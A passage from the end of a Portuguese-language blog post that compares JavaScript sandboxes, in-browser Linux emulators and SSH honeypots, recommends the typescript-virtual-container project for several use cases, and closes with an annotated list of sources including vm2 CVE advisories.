→ `v86` (OS completo, pesado, lento para bootar) ou o bundle de navegador de `typescript-virtual-container` (simulador, mais leve, boot instantâneo, inclui `startxfce4` para um desktop completo o que é bem legal por sinal).

**Você precisa de tutoriais de código interativos online ou um IDE de navegador.**
→ WebContainers se seu foco é o ecossistema Node.js. CheerpX se precisa de um userspace Linux de verdade. O bundle de navegador de `typescript-virtual-container` se quer uma opção mais leve com API tipada.

**Você quer coletar TTPs de atacantes SSH em grande escala.**
→ Cowrie é o padrão de produção, ponto final. Roda em qualquer servidor Linux, integra com todos os SIEM, agora tem modo LLM. Só usa Cowrie.

**Você quer dados de honeypot SSH em uma aplicação Node.js com API programável.**
→ `typescript-virtual-container`. Os comandos executam de verdade. O VFS é uma estrutura de dados de verdade que você pode capturar e diferenciar na hora. O atacante ganha um ambiente interativo convincente, e você ganha dados de auditoria estruturados sem sair do Node.

**Você precisa de automação shell / testes em CI sem Docker.**
→ `typescript-virtual-container`. Boota em menos de um segundo, snapshot antes de um teste, restaura depois. Executa comandos shell com API tipada. Sem daemon Docker, sem kernel, sem VM, sem espera.

**Você precisa de ambientes shell multilocatários (SaaS, educação, treinamento).**
→ `typescript-virtual-container`. 5-20 MB por instância vs. 150-256 MB para um emulador. 100 usuários simultâneos : ~2 GB vs. ~25 GB. É uma baita diferença em custos de hospedagem !

**Você precisa de um honeypot realista que também permite construir um laboratório de rede multi-VM.**
→ `typescript-virtual-container` é a única coisa nesse espaço que faz os dois.

---

## O que ele não consegue fazer (e quero ser honesto nisso)

Não consegue executar binários x86 nativos. Se você precisa compilar código C, rodar um interpretador Python de verdade, ou usar software compilado para Linux, não há ABI de kernel para sustentar essas syscalls. Comandos como `gcc`, `python3`, e `node` são stubs -- respondem a `--version` e a invocações comuns, mas não executam nada real.

É o compromisso fundamental : você ganha de 10 a 50 vezes menos memória, boot instantâneo, compatibilidade com navegador, API tipada, SSH de verdade, e rede virtual -- e abre mão da compatibilidade binária com o userspace Linux.

Fortune pensou bastante nisso ao projetar. Para os casos de uso que ela mirava -- honeypots, testes, terminais embutidos, ambientes CI -- executar um binário compilado na verdade nunca é necessário. Pipelines shell, manipulação de arquivos, roteamento de rede e SSH cobrem tudo. Mas se seu caso de uso exige software compilado de verdade, `v86` ou Docker é a resposta certa, não isso.

---

## Para concluir

Então é isso. Esse ecossistema é mais amplo e mais fragmentado do que parece de fora. `vm` é um separador de escopo, não um sandbox. `vm2` continua acumulando CVEs (de verdade, olha os avisos deste mês). `isolated-vm` é a resposta certa para isolamento JS mas só JS. `quickjs-emscripten` é a escolha certa quando você precisa de compatibilidade com navegador ou quer evitar extensões nativas. `v86` e CheerpX são emuladores de verdade quando você precisa de compatibilidade binária de verdade. WebContainers é Node.js em Wasm, não um ambiente Linux genérico. Cowrie é o padrão-ouro dos honeypots SSH, mas é Python e não nativo Node.

E aí tem `typescript-virtual-container` -- o projeto da Fortune -- que vive meio na própria categoria. Nem emulador, nem sandbox JS, nem honeypot passivo. Algo entre todos que se revelou surpreendentemente útil para muita coisa que nenhum dos outros consegue fazer.

`typescript-virtual-container` preenche a lacuna que nenhum dos outros toca : um ambiente shell Linux completo e programável com SSH de verdade, SFTP, permissões POSIX, gestão de usuários, rede virtual, e uma API TypeScript tipada -- rodando em uns 10 MB, bootando em menos de um segundo, funcionando tanto em Node.js quanto no navegador.

Se quer experimentar : o código-fonte está em [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) e há uma demo online (incluindo `startxfce4` para um desktop completo, o que é francamente doido) em [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Vai lá e deixa umas estrelas para a Fortune no GitHub, ela merece !

Obrigado por ler -- esse foi longo até para meus padrões :) espero que tenha sido útil !

---

## Fontes

Tentei ligar cada afirmação a uma fonte primária -- avisos CVE, docs oficiais, repos GitHub, artigos de blog dos mantenedores. Algumas notas : a lista de CVEs do vm2 continua crescendo então o link FortiGuard pode estar desatualizado quando você ler isso (olha a página de avisos do GitHub para as mais recentes). Os links Bellard são todos estáveis -- o site pessoal dele está lá desde sempre e o conteúdo não muda. E se quer aprofundar algum dos polyfills, basta passear pela pasta `polyfills/` no repo `typescript-virtual-container` direto -- é mais legível que qualquer descrição que eu poderia escrever aqui.

### Sandboxes JavaScript

- **Módulo `vm` do Node.js** -- documentação oficial : [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Aviso de segurança `vm` do Node.js** -- "O módulo vm não é um mecanismo de segurança. Não use para executar código não confiável" : [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm : [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub : [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Cronologia de CVEs vm2** -- Alerta FortiGuard com a lista completa de CVEs e datas : [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Fuga por erro async, GHSA : [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + fuga Function, gist PoC : [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Entrada Exploit DB com PoC completo : [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVEs vm2 2026** -- 11 novas fugas, análise : [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer : [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** -- Post-mortem de oxeye.io sobre CVE-2022-36067 : [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm : [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub : [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Internos V8 Isolate** -- Guia de integração : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm : [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub : [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm : [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub : [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Motor QuickJS** -- por Fabrice Bellard : [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Modelo de permissões Deno** -- docs : [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Lançamento Deno 2** -- Outubro de 2024 : [deno.com/blog/v2](https://deno.com/blog/v2)
- **Proposta TC39 ShadowRealm** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Proposta TC39 Compartments** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** -- Artigo prático de Andrew Healey sobre a abordagem de sandbox Deno : [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Emuladores Linux

- **`v86`** -- npm : [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub : [github.com/copy/v86](https://github.com/copy/v86) · Demo : [copy.sh/v86](https://copy.sh/v86)
- **Matriz de suporte OS v86** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS usado pelo v86) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Extensões Bochs VBE** (referência VGA) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Emulador do Bellard : [bellard.org/jslinux](https://bellard.org/jslinux/) · Notas técnicas (TinyEMU, histórico, asm.js→Wasm) : [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Fonte C : [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Espelhos GitHub não oficiais : [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- Emulador JS OpenRISC : [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo : [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- docs : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Guia pthreads : [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm : [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Docs API : [webcontainers.io](https://webcontainers.io) · Anúncio : [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Prévia InfoQ : [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub : [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Artigo de blog NTT : [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Artigo de Simon Willison : [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminal

- **xterm.js** -- npm : [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub : [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · site : [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm : [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft) : [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie** -- GitHub : [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Docs : [docs.cowrie.org](https://docs.cowrie.org) · Site : [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (arquivado) : [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub : [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub : [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub : [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Honeypot SSH Node.js mínimo : [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Lista organizada : [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- Descoberta de informações de sistema (como atacantes identificam honeypots) : [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm** : [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub** : [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo online** : [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Guia de arquitetura** : [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (implementação do protocolo SSH) -- npm : [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub : [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (compressão dos snapshots VFS) -- npm : [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (transporte shell WebSocket) -- npm : [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Leituras complementares

- **Modelo de permissões POSIX** -- Especificação Open Group : [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (padrão usado na persistência VFS) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Modelo V8 Isolate** -- "Embedder's Guide" : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Especificação ISA RISC-V** (para o contexto TinyEMU/JSLinux) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Arquitetura OpenRISC 1000** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, contraste útil com a abordagem Wasm : [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** -- Simon Willison TIL sobre o tamanho do bundle quickjs-emscripten : [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
